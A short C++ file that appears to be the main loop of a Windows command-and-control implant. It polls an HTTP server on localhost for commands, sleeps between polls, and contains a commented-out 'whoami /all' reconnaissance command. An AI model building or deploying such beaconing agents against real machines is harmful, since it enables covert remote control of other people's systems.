#include <iostream>
#include "core.h"
#include "windows.h"
#include "HttpCommunicator.h"


int main() {
	core c;

	// test cmd execution
	// [DONE] we need to update the process functions to redirect everything from STDOUT to a pipe (anon or named - TBD) - see this: https://stackoverflow.com/questions/42402673/createprocess-and-capture-stdout @teodor

	HttpCommunicator httpCommunicator("127.0.0.1", 8081);

	//c.execute_command("shell whoami /all");

	
	// Wait for commands
	for (;;)
	{
		httpCommunicator.get_commands();

		if (core::terminated)
			break;

		// Sleep for 50*1000ms
		Sleep(core::sleepTime * 1000);
	}
}